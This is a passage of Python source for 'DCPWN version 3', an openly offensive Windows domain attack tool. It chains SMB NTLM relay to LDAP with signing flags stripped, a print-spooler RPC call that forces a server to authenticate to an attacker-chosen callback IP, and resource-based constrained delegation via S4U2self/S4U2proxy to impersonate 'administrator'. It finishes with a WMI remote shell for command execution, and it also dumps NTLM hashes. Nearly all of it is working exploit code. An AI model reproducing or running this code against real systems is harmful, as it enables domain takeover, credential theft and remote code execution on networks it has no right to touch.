                if errorCode != STATUS_SUCCESS:
                    # Let's return what the target returned, hope the client connects back again
                    packet = smb.NewSMBPacket()
                    packet['Flags1'] = smb.SMB.FLAGS1_REPLY | smb.SMB.FLAGS1_PATHCASELESS
                    packet['Flags2'] = smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_EXTENDED_SECURITY
                    packet['Command'] = recvPacket['Command']
                    packet['Pid'] = recvPacket['Pid']
                    packet['Tid'] = recvPacket['Tid']
                    packet['Mid'] = recvPacket['Mid']
                    packet['Uid'] = recvPacket['Uid']
                    packet['Data'] = '\x00\x00\x00'
                    packet['ErrorCode'] = errorCode >> 16
                    packet['ErrorClass'] = errorCode & 0xff

                    LOG.error("Authenticating against %s://%s as %s\%s FAILED" % (
                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'],
                        authenticateMessage['user_name']))

                    # Log this target as processed for this client
                    # self.targetprocessor.logTarget(self.target)

                    client.killConnection()

                    return None, [packet], errorCode
                else:
                    # We have a session, create a thread and do whatever we want
                    LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
                        self.target.scheme, self.target.netloc, authenticateMessage['domain_name'],
                        authenticateMessage['user_name']))

                    # Log this target as processed for this client
                    # self.targetprocessor.logTarget(self.target, True)



                    del (smbData[self.target])

                    self.do_attack(client)
                    # Now continue with the server
                #############################################################

                respToken = SPNEGO_NegTokenResp()
                # accept-completed
                respToken['NegResult'] = '\x00'

                # Status SUCCESS
                errorCode = STATUS_SUCCESS
                # Let's store it in the connection data
                connData['AUTHENTICATE_MESSAGE'] = authenticateMessage
            else:
                raise Exception("Unknown NTLMSSP MessageType %d" % messageType)

            respParameters['SecurityBlobLength'] = len(respToken)

            respData['SecurityBlobLength'] = respParameters['SecurityBlobLength']
            respData['SecurityBlob'] = respToken.getData()

        else:
            # Process Standard Security
            # TODO: Fix this for other protocols than SMB [!]
            respParameters = smb.SMBSessionSetupAndXResponse_Parameters()
            respData = smb.SMBSessionSetupAndXResponse_Data()
            sessionSetupParameters = smb.SMBSessionSetupAndX_Parameters(SMBCommand['Parameters'])
            sessionSetupData = smb.SMBSessionSetupAndX_Data()
            sessionSetupData['AnsiPwdLength'] = sessionSetupParameters['AnsiPwdLength']
            sessionSetupData['UnicodePwdLength'] = sessionSetupParameters['UnicodePwdLength']
            sessionSetupData.fromString(SMBCommand['Data'])

            client = smbData[self.target]['SMBClient']
            _, errorCode = client.sendStandardSecurityAuth(sessionSetupData)

            if errorCode != STATUS_SUCCESS:
                # Let's return what the target returned, hope the client connects back again
                packet = smb.NewSMBPacket()
                packet['Flags1'] = smb.SMB.FLAGS1_REPLY | smb.SMB.FLAGS1_PATHCASELESS
                packet['Flags2'] = smb.SMB.FLAGS2_NT_STATUS | smb.SMB.FLAGS2_EXTENDED_SECURITY
                packet['Command'] = recvPacket['Command']
                packet['Pid'] = recvPacket['Pid']
                packet['Tid'] = recvPacket['Tid']
                packet['Mid'] = recvPacket['Mid']
                packet['Uid'] = recvPacket['Uid']
                packet['Data'] = '\x00\x00\x00'
                packet['ErrorCode'] = errorCode >> 16
                packet['ErrorClass'] = errorCode & 0xff

                # Log this target as processed for this client
                # self.targetprocessor.logTarget(self.target)

                # Finish client's connection
                # client.killConnection()

                return None, [packet], errorCode
            else:
                # We have a session, create a thread and do whatever we want
                LOG.info("Authenticating against %s://%s as %s\%s SUCCEED" % (
                    self.target.scheme, self.target.netloc, sessionSetupData['PrimaryDomain'],
                    sessionSetupData['Account']))

                self.authUser = ('%s/%s' % (sessionSetupData['PrimaryDomain'], sessionSetupData['Account'])).upper()

                # Log this target as processed for this client
                # self.targetprocessor.logTarget(self.target, True)

                ntlm_hash_data = outputToJohnFormat('', sessionSetupData['Account'],
                                                    sessionSetupData['PrimaryDomain'],
                                                    sessionSetupData['AnsiPwd'], sessionSetupData['UnicodePwd'])
                client.sessionData['JOHN_OUTPUT'] = ntlm_hash_data

                if self.server.getJTRdumpPath() != '':
                    writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'],
                                          self.server.getJTRdumpPath())

                del (smbData[self.target])

                self.do_attack(client)
                # Now continue with the server
                #############################################################

        respData['NativeOS'] = smbServer.getServerOS()
        respData['NativeLanMan'] = smbServer.getServerOS()
        respSMBCommand['Parameters'] = respParameters
        respSMBCommand['Data'] = respData

        # From now on, the client can ask for other commands
        connData['Authenticated'] = True

        #############################################################
        # SMBRelay
        smbServer.setConnectionData('SMBRelay', smbData)
        #############################################################
        smbServer.setConnectionData(connId, connData)

        return [respSMBCommand], None, errorCode

    ################################################################################

    # Initialize the correct client for the relay target
    def init_client(self, extSec):
        client = LDAPRelayClient(dc_ip=self.dc_ip, target=self.target_fqdn, domain=self.domain,
                                 target_hostname=self.target_hostname, username=self.username,
                                 dn=self.dn)
        client.initConnection()
        # clientChallengeMessage = self.client.sendNegotiate(token)
        return client

        #
        # if self.config.protocolClients.has_key(self.target.scheme.upper()):
        #     client = self.config.protocolClients[self.target.scheme.upper()](self.config, self.target,
        #                                                                      extendedSecurity=extSec)
        #     client.initConnection()
        # else:
        #     raise Exception('Protocol Client for %s not found!' % self.target.scheme)
        #
        # return client

    def do_ntlm_negotiate(self, client, token):
        # Since the clients all support the same operations there is no target protocol specific code needed for now
        return client.sendNegotiate(token)

    def do_ntlm_auth(self, client, SPNEGO_token, challenge):
        # The NTLM blob is packed in a SPNEGO packet, extract it for methods other than SMB
        #

        # my code starts here
        spnego = SPNEGO_NegTokenResp(SPNEGO_token)
        token = spnego['ResponseToken']

        type3 = ntlm.NTLMAuthChallengeResponse()
        type3.fromString(token)
        type3['flags'] = type3['flags'] & ~0x00000010  # take out negotiate sign
        type3['flags'] = type3['flags'] & ~0x00008000  # take out always sign

        type3_offset = SPNEGO_token.find(token)
        type3_len = len(token)

        SPNEGO_token = SPNEGO_token[:type3_offset] + type3.getData() + SPNEGO_token[type3_offset + type3_len:]

        clientResponse, errorCode = client.sendAuth(str(SPNEGO_token), challenge)

        return clientResponse, errorCode

    def do_attack(self, client):
        # Do attack. Note that unlike the HTTP server, the config entries are stored in the current object and not in any of its properties
        # Check if SOCKS is enabled and if we support the target scheme
        # if self.config.runSocks and self.target.scheme.upper() in self.config.socksServer.supportedSchemes:
        #     if self.config.runSocks is True:
        #         # Pass all the data to the socksplugins proxy
        #         activeConnections.put(
        #             (self.target.hostname, client.targetPort, self.authUser, client, client.sessionData))
        #         return
        #
        # # If SOCKS is not enabled, or not supported for this scheme, fall back to "classic" attacks
        # if self.target.scheme.upper() in self.config.attacks:
        #     # We have an attack.. go for it
        #     clientThread = self.config.attacks[self.target.scheme.upper()](self.config, client.session,
        #                                                                    self.authUser)
        #     clientThread.start()
        # else:
        #     LOG.error('No attack configured for %s' % self.target.scheme.upper())

        global time2pwn
        time2pwn.set()

    def _start(self):
        self.server.daemon_threads = True
        self.server.serve_forever()
        LOG.info('Shutting down SMB Server')
        self.server.server_close()

    def run(self):
        LOG.info("Setting up SMB Server")
        self._start()



# by @agsolino and @elad_shamir see: https://github.com/SecureAuthCorp/impacket/pull/560
class GETST:
    def __init__(self, target, password, domain, options):
        self.__password = password
        self.__user = target
        self.__domain = domain
        self.__aesKey = options.aesKey
        self.__options = options
        self.__kdcHost = options.dc_ip
        self.__saveFileName = None
        self.__lmhash = ''
        self.__nthash = ''
        if options.hashes is not None:
            self.__lmhash = '00000000000000000000000000000000'
            self.__nthash = options.hashes

    def saveTicket(self, ticket, sessionKey):
        print '[*] saving ticket: %s' % (self.__saveFileName + '.ccache')
        ccache = CCache()
        ccache.fromTGS(ticket, sessionKey, sessionKey)
        ccache.saveFile(self.__saveFileName + '.ccache')

    def doS4U(self, tgt, cipher, oldSessionKey, sessionKey):
        decodedTGT = decoder.decode(tgt, asn1Spec=AS_REP())[0]

        # Extract the ticket from the TGT
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # In the S4U2self KRB_TGS_REQ/KRB_TGS_REP protocol extension, a service
        # requests a service ticket to itself on behalf of a user. The user is
        # identified to the KDC by the user's name and realm.
        clientName = Principal(self.__options.impersonate, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        S4UByteArray = struct.pack('<I', constants.PrincipalNameType.NT_PRINCIPAL.value)
        S4UByteArray += self.__options.impersonate + self.__domain + 'Kerberos'

        # Finally cksum is computed by calling the KERB_CHECKSUM_HMAC_MD5 hash
        # with the following three parameters: the session key of the TGT of
        # the service performing the S4U2Self request, the message type value
        # of 17, and the byte array S4UByteArray.
        checkSum = _HMACMD5.checksum(sessionKey, 17, S4UByteArray)

        paForUserEnc = PA_FOR_USER_ENC()
        seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)
        paForUserEnc['userRealm'] = self.__domain
        paForUserEnc['cksum'] = noValue
        paForUserEnc['cksum']['cksumtype'] = int(constants.ChecksumTypes.hmac_md5.value)
        paForUserEnc['cksum']['checksum'] = checkSum
        paForUserEnc['auth-package'] = 'Kerberos'

        encodedPaForUserEnc = encoder.encode(paForUserEnc)

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_FOR_USER.value)
        tgsReq['padata'][1]['padata-value'] = encodedPaForUserEnc

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.canonicalize.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)

        serverName = Principal(self.__user, type=constants.PrincipalNameType.NT_UNKNOWN.value)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        reqBody['realm'] = str(decodedTGT['crealm'])

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (int(cipher.enctype), int(constants.EncryptionTypes.rc4_hmac.value)))

        print '[*] requesting s4U2self'
        message = encoder.encode(tgsReq)

        r = sendReceive(message, self.__domain, None)

        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

        ################################################################################
        # Up until here was all the S4USelf stuff. Now let's start with S4U2Proxy
        # So here I have a ST for me.. I now want a ST for another service
        # Extract the ticket from the TGT
        ticketTGT = Ticket()
        ticketTGT.from_asn1(decodedTGT['ticket'])

        ticket = Ticket()
        ticket.from_asn1(tgs['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] = constants.encodeFlags(opts)
        seq_set(apReq, 'ticket', ticketTGT.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1(decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] = 5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        # Add resource-based constrained delegation support
        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = 167
        tgsReq['padata'][1]['padata-value'] = "3009a00703050010000000".decode("hex")

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        # This specified we're doing S4U
        opts.append(constants.KDCOptions.cname_in_addl_tkt.value)
        opts.append(constants.KDCOptions.canonicalize.value)
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)

        reqBody['kdc-options'] = constants.encodeFlags(opts)
        service2 = Principal(self.__options.spn, type=constants.PrincipalNameType.NT_SRV_INST.value)
        seq_set(reqBody, 'sname', service2.components_to_asn1)
        reqBody['realm'] = self.__domain

        myTicket = ticket.to_asn1(TicketAsn1())
        seq_set_iter(reqBody, 'additional-tickets', (myTicket,))

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                     (
                         int(constants.EncryptionTypes.rc4_hmac.value),
                         int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
                         int(constants.EncryptionTypes.des_cbc_md5.value),
                         int(cipher.enctype)
                     )
                     )
        message = encoder.encode(tgsReq)
        print '[+] s4u2self complete'

        print '[*] requesting s4U2proxy'
        r = sendReceive(message, self.__domain, None)

        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]

        cipherText = tgs['enc-part']['cipher']

        # Key Usage 8
        # TGS-REP encrypted part (includes application session
        # key), encrypted with the TGS session key (Section 5.4.2)
        plainText = cipher.decrypt(sessionKey, 8, str(cipherText))

        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]

        newSessionKey = Key(encTGSRepPart['key']['keytype'], str(encTGSRepPart['key']['keyvalue']))

        # Creating new cipher based on received keytype
        cipher = _enctype_table[encTGSRepPart['key']['keytype']]
        print '[+] s4U2proxy complete'

        return r, cipher, sessionKey, newSessionKey

    def run(self):
        userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        print '[*] getting tgt for %s' % userName
        tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
                                                                unhexlify(self.__lmhash), unhexlify(self.__nthash),
                                                                self.__aesKey,
                                                                self.__kdcHost)
        print '[*] impersonating %s' % self.__options.impersonate
        tgs, copher, oldSessionKey, sessionKey = self.doS4U(tgt, cipher, oldSessionKey, sessionKey)
        self.__saveFileName = 'evil'
        self.saveTicket(tgs, oldSessionKey)


# adapted from https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py
# def wmi_exec(target, dc_ip, command):
#     dcom = DCOMConnection(target, oxidResolver=True, doKerberos=True, kdcHost=dc_ip)
#     try:
#         iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
#         iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
#         iWbemServices = iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
#         iWbemLevel1Login.RemRelease()
#         win32Process, _ = iWbemServices.GetObject('Win32_Process')
#         win32Process.Create(command, unicode('C:\\'), None)
#         dcom.disconnect()
#     except Exception, e:
#         print "[!] exception raised: %s" % str(e)
#         sys.exit()


CODEC = sys.stdout.encoding
OUTPUT_FILENAME = '__' + str(time.time())
class WMIEXEC:
    def __init__(self, command='', username='', password='', domain='', hashes=None, aesKey=None, share=None,
                 noOutput=False, doKerberos=False, kdcHost=None):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = aesKey
        self.__share = share
        self.__noOutput = noOutput
        self.__doKerberos = doKerberos
        self.__kdcHost = kdcHost
        self.shell = None
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):
        if self.__noOutput is False:
            smbConnection = SMBConnection(addr, addr)
            if self.__doKerberos is False:
                smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
            else:
                smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                            self.__nthash, self.__aesKey, kdcHost=self.__kdcHost)

            dialect = smbConnection.getDialect()
            if dialect == SMB_DIALECT:
                logging.info("SMBv1 dialect used")
            elif dialect == SMB2_DIALECT_002:
                logging.info("SMBv2.0 dialect used")
            elif dialect == SMB2_DIALECT_21:
                logging.info("SMBv2.1 dialect used")
            else:
                logging.info("SMBv3.0 dialect used")
        else:
            smbConnection = None

        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash,
                              self.__aesKey, oxidResolver=True, doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)
        try:
            iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
            iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
            iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
            iWbemLevel1Login.RemRelease()

            win32Process,_ = iWbemServices.GetObject('Win32_Process')

            self.shell = RemoteShell(self.__share, win32Process, smbConnection)
            if self.__command != ' ':
                self.shell.onecmd(self.__command)
            else:
                self.shell.cmdloop()
        except  (Exception, KeyboardInterrupt), e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(str(e))
            if smbConnection is not None:
                smbConnection.logoff()
            dcom.disconnect()
            sys.stdout.flush()
            sys.exit(1)

        if smbConnection is not None:
            smbConnection.logoff()
        dcom.disconnect()

class RemoteShell(cmd.Cmd):
    def __init__(self, share, win32Process, smbConnection):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__output = '\\' + OUTPUT_FILENAME
        self.__outputBuffer = unicode('')
        self.__shell = 'cmd.exe /Q /c '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__pwd = unicode('C:\\')
        self.__noOutput = False
        self.intro = '[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands'

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(100000)
            self.do_cd('\\')
        else:
            self.__noOutput = True

    def do_shell(self, s):
        os.system(s)

    def do_help(self, line):
        print """
 lcd {path}                 - changes the current local directory to {path}
 exit                       - terminates the server process (and this session)
 put {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
 get {file}                 - downloads pathname to the current local dir 
 ! {cmd}                    - executes a local shell cmd
"""

    def do_lcd(self, s):
        if s == '':
            print os.getcwd()
        else:
            try:
                os.chdir(s)
            except Exception, e:
                logging.error(str(e))

    def do_get(self, src_path):

        try:
            import ntpath
            newPath = ntpath.normpath(ntpath.join(self.__pwd, src_path))
            drive, tail = ntpath.splitdrive(newPath)
            filename = ntpath.basename(tail)
            fh = open(filename,'wb')
            logging.info("Downloading %s\\%s" % (drive, tail))
            self.__transferClient.getFile(drive[:-1]+'$', tail, fh.write)
            fh.close()

        except Exception, e:
            logging.error(str(e))

            if os.path.exists(filename):
                os.remove(filename)



    def do_put(self, s):
        try:
            params = s.split(' ')
            if len(params) > 1:
                src_path = params[0]
                dst_path = params[1]
            elif len(params) == 1:
                src_path = params[0]
                dst_path = ''

            src_file = os.path.basename(src_path)
            fh = open(src_path, 'rb')
            dst_path = string.replace(dst_path, '/','\\')
            import ntpath
            pathname = ntpath.join(ntpath.join(self.__pwd,dst_path), src_file)
            drive, tail = ntpath.splitdrive(pathname)
            logging.info("Uploading %s to %s" % (src_file, pathname))
            self.__transferClient.putFile(drive[:-1]+'$', tail, fh.read)
            fh.close()
        except Exception, e:
            logging.critical(str(e))
            pass

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer.strip('\r\n')) > 0:
            print self.__outputBuffer
            self.__outputBuffer = u''
        else:
            self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s.decode(sys.stdin.encoding)))
            self.execute_remote('cd ')
            self.__pwd = self.__outputBuffer.strip('\r\n')
            self.prompt = unicode(self.__pwd + '>').encode(CODEC)
            self.__outputBuffer = u''

    def default(self, line):
        # Let's try to guess if the user is trying to change drive
        if len(line) == 2 and line[1] == ':':
            # Execute the command and see if the drive is valid
            self.execute_remote(line)
            if len(self.__outputBuffer.strip('\r\n')) > 0:
                # Something went wrong
                print self.__outputBuffer
                self.__outputBuffer = u''
            else:
                # Drive valid, now we should get the current path
                self.__pwd = line
                self.execute_remote('cd ')
                self.__pwd = self.__outputBuffer.strip('\r\n')
                self.prompt = unicode(self.__pwd + '>').encode(CODEC)
                self.__outputBuffer = u''
        else:
            if line != '':
                self.send_data(line)

    def get_output(self):
        def output_callback(data):
            try:
                self.__outputBuffer += data.decode(CODEC)
            except UnicodeDecodeError, e:
                logging.error('Decoding error detected, consider running chcp.com at the target,\nmap the result with '
                              'https://docs.python.org/2.4/lib/standard-encodings.html\nand then execute wmiexec.py '
                              'again with -codec and the corresponding codec')
                self.__outputBuffer += data.decode(CODEC, errors='replace')

        if self.__noOutput is True:
            self.__outputBuffer = u''
            return

        while True:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception, e:
                if str(e).find('STATUS_SHARING_VIOLATION') >=0:
                    # Output not finished, let's wait
                    time.sleep(1)
                    pass
                elif str(e).find('Broken') >= 0:
                    # The SMB Connection might have timed out, let's try reconnecting
                    logging.debug('Connection broken, trying to recreate it')
                    self.__transferClient.reconnect()
                    return self.get_output()
        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data):
        command = self.__shell + data
        if self.__noOutput is False:
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
        self.__win32Process.Create(command.decode(sys.stdin.encoding), self.__pwd, None)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print self.__outputBuffer
        self.__outputBuffer = u''



def call_open_printer(dc, dce):
    logging.info("getting context handle...")
    try:
        resp = rprn.hRpcOpenPrinter(dce, "\\\\%s\x00" % dc)

    except Exception as e:
        logging.error("exception " + str(e))
        dce.disconnect()
        sys.exit()
    return resp['pHandle']


def trigger_callback(dce, handle, listener):
    logging.info("sending RFFPCNEX...")
    try:
        resp = rprn.hRpcRemoteFindFirstPrinterChangeNotificationEx(dce, handle, rprn.PRINTER_CHANGE_ADD_JOB,
                                                                   pszLocalMachine='\\\\%s\x00' % listener)

    except Exception as e:
        if str(e).find('RPC_S_SERVER_UNAVAILABLE') >= 0:
            logging.info('Got expected RPC_S_SERVER_UNAVAILABLE exception. Attack worked')
            pass
        else:
            logging.error("exception %s" % str(e))


def create_connection(dc, domain, username, password, ntlm):
    # set up connection prereqs
    # creds
    creds = {}
    creds['username'] = username
    creds['password'] = password
    creds['domain'] = domain
    creds['nthash'] = ntlm
    # to transport
    stringBinding = r'ncacn_np:%s[\pipe\spoolss]' % dc
    rpctransport = transport.DCERPCTransportFactory(stringBinding)
    if hasattr(rpctransport, 'set_credentials'):
        rpctransport.set_credentials(creds['username'], creds['password'], creds['domain'], nthash=creds['nthash'])
    dce = rpctransport.get_dce_rpc()
    # actually connect
    logging.info("connecting to %s" % dc)
    try:
        dce.connect()
    except Exception as e:
        if "STATUS_ACCESS_DENIED" in str(e):
            logging.error("access denied")
            sys.exit()
        else:
            logging.error("unhandled exception occured: %s" % str(e))
            sys.exit()
    # defines the printer endpoint
    try:
        dce.bind(rprn.MSRPC_UUID_RPRN)
    except Exception as e:
        logging.error("unhandled exception: %s" % str(e))
        sys.exit()
    logging.info("bound to spoolss")
    return dce


time2pwn = threading.Event()


if __name__ == '__main__':

    # python dcpwn.py -debug -d ateam.com -u user2 -p 1qazXSW@ --dc 192.168.0.2 --callback-ip 192.168.7.254 --ldaps mem.ateam.com 192.168.0.3 cmd.exe

    parser = ArgumentParser(add_help=True, description="DCPWN version 3 (n1nty @ QAX A-TEAM)")
    parser.add_argument('-d', '--domain', action="store", default='', help='valid fully-qualified domain name',
                        required=True)


    # 一个普通域账号，这个账号上如果没有设置 SPN，则会创建一个机器账号，机器账号的名与密码通过 --machine-user 与 --machine-pass 指定， 如果没有指定的话就随机生成
    parser.add_argument('-u', '--username', action="store", default='', help='valid domain username', required=True)
    password_or_ntlm = parser.add_mutually_exclusive_group(required=True)
    password_or_ntlm.add_argument('-p', '--password', action="store", default='', help='valid password')
    password_or_ntlm.add_argument('-n', '--nthash', action="store", default='', help='valid ntlm hash')

    # parser.add_argument('--mssql-port', action="store", default=1433, help='mssql server port')
    # parser.add_argument('--mssql-user', action="store", default='',
    #                     help='mssql server username (if different from domain account)')
    # parser.add_argument('--mssql-pass', action="store", default='',
    #                     help='mssql server password (if different from domain account)')
    #

    parser.add_argument('--machine-user', action="store", default='',
                        help="machine account name (if provided domain account has no SPN and a machine account will be created)")
    parser.add_argument('--machine-pass', action="store", default='',
                        help="machine account password (if provided domain account has no SPN and a machine account will be created)")


    # 触发 wevdav 回连时用的 HOSTNAME 与 PORT， 忽略
    # parser.add_argument('--server-hostname', action="store", default='',
    #                     help="hostname to use for the relaying server (ie, this machine); this should adhere to 'The Dot rule' to elicit NTLM authentication")

    parser.add_argument('--local-smb-port', action="store", default=445,
                        help="port to use for the relaying server (ie, this machine)")

    parser.add_argument('--callback-ip', action="store", default='', required=True,
                        help="ip to force the target to connect back to")

    parser.add_argument("--ldaps", help="use ldaps",
                        action="store_true")


    parser.add_argument('--dc', help='ip address or hostname of the domain controller', required=True)
    parser.add_argument('--target_hostname', help='samaccountname of the target server')

    parser.add_argument('target', help='fqdn of the target server')
    parser.add_argument('targetip', help='ip of the target server')
    parser.add_argument('command', help='command to execute over WMI')

    options = parser.parse_args()



    print """
    ____  __________ _       ___   __
   / __ \/ ____/ __ \ |     / / | / /
  / / / / /   / /_/ / | /| / /  |/ / 
 / /_/ / /___/ ____/| |/ |/ / /|  /  
/_____/\____/_/     |__/|__/_/ |_/   
                                     
n1nty @ QAX A-TEAM
"""
    print "DCPWN version 3, PWN Domain Servers in seconds\n"
    print "-----------------------------------------"

    if not options.target_hostname:
        options.target_hostname = options.target.split('.')[0].upper() + '$'

    print "[*] %s(%s, %s) will connect to %s, then be relayed to DC at %s" % (options.target, options.target_hostname, options.targetip, options.callback_ip, options.dc)

    logging.getLogger().setLevel(logging.DEBUG)

    # get dn
    dn = ''
    domain_parts = options.domain.split('.')
    for i in domain_parts:
        dn += 'DC=%s,' % i
    dn = dn[:-1]

    # if '.' in options.server_hostname:
    #     print '[!] server hostname contains periods and the NTLM relay may fail'

    attack_setup = SetupAttack(username=options.username, domain=options.domain, password=options.password,
                               nthash=options.nthash, dn=dn,
                               machine_username=options.machine_user, machine_password=options.machine_pass,
                               dc_ip=options.dc, use_ssl=options.ldaps) # todo ldaps 支持
    spn_username, spn_password, server_hostname = attack_setup.execute()

    print "[*] starting relay server on port %s" % options.local_smb_port
    # s = HTTPRelayServer(domain=options.domain, dc_ip=options.dc, username=spn_username, target=options.target,
    #                     target_hostname=options.target_hostname, dn=dn, port=options.server_port)
    s = SMBRelayServer(domain=options.domain, dc_ip=options.dc, username=spn_username, target_fqdn=options.target,
                        target_hostname=options.target_hostname, dn=dn, port=options.local_smb_port, ldaps=options.ldaps)
    s.start()

    ### 运行到这里之前，ntlm relay 的过程必须已经完成，resource based constrained delegation 必须已经添加了



    dce = create_connection(options.targetip, options.domain, options.username, options.password, options.nthash)
    handle = call_open_printer(options.targetip, dce)
    trigger_callback(dce, handle, options.callback_ip)

    time2pwn.wait()
    dce.disconnect()

    print('rbcd attack done, sleep for 20 seconds')
    sleep(20)

    print "[*] executing s4u2pwnage"
    identity = '%s/%s:%s' % (options.domain, spn_username, spn_password)
    spn = 'cifs/%s' % options.target
    if spn_username == options.username and options.nthash:
        rbcd_args = Namespace(aesKey=None, dc_ip=options.dc, debug=False, hashes=options.nthash,
                              impersonate='administrator', k=False, no_pass=False, spn=spn)
    else:
        rbcd_args = Namespace(aesKey=None, dc_ip=options.dc, debug=False, hashes=None, impersonate='administrator',
                              k=False, no_pass=False, spn=spn)
    do_rbcd_attack = GETST(spn_username, spn_password, options.domain, rbcd_args)
    do_rbcd_attack.run()

